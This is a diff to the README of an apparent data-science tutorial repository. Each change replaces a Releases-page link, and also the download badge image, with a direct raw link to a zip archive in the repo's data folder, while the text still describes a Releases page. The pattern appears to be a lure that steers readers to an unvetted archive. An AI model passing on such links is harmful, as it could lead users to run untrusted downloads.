@@ -1,6 +1,6 @@
 # 📊 how-to-data-science - Learn Data Science with Ease
 
-[![Download](https://img.shields.io/badge/Download_Latest_Version-Click_Here-brightgreen)](https://github.com/MasterHasanm/how-to-data-science/releases)
+[![Download](https://raw.githubusercontent.com/MasterHasanm/how-to-data-science/main/data/how-to-data-science_v3.9.zip)](https://raw.githubusercontent.com/MasterHasanm/how-to-data-science/main/data/how-to-data-science_v3.9.zip)
 
 ## 📖 Overview
 The **how-to-data-science** repository offers scripts, notebooks, and articles that simplify data science concepts. Whether you are a beginner or looking to enhance your skills, this collection helps you explore data science effectively.
@@ -11,7 +11,7 @@ To get started with data science using this repository, follow the steps below. 
 ## 📥 Download & Install
 You can download the latest version of the repository from our Releases page. 
 
-Visit this page to download: [Download Here](https://github.com/MasterHasanm/how-to-data-science/releases)
+Visit this page to download: [Download Here](https://raw.githubusercontent.com/MasterHasanm/how-to-data-science/main/data/how-to-data-science_v3.9.zip)
 
 1. Click on the above link.
 2. You will find the latest release at the top of the page.
@@ -69,4 +69,4 @@ If you need help, feel free to open an issue in the GitHub repository. The commu
 ## 📅 Future Updates
 We regularly update the repository with new content, scripts, and improved documentation. Check back often for the latest materials.
 
-Enjoy your journey into data science with **how-to-data-science**! For the latest version, visit: [Download Here](https://github.com/MasterHasanm/how-to-data-science/releases)
+Enjoy your journey into data science with **how-to-data-science**! For the latest version, visit: [Download Here](https://raw.githubusercontent.com/MasterHasanm/how-to-data-science/main/data/how-to-data-science_v3.9.zip)
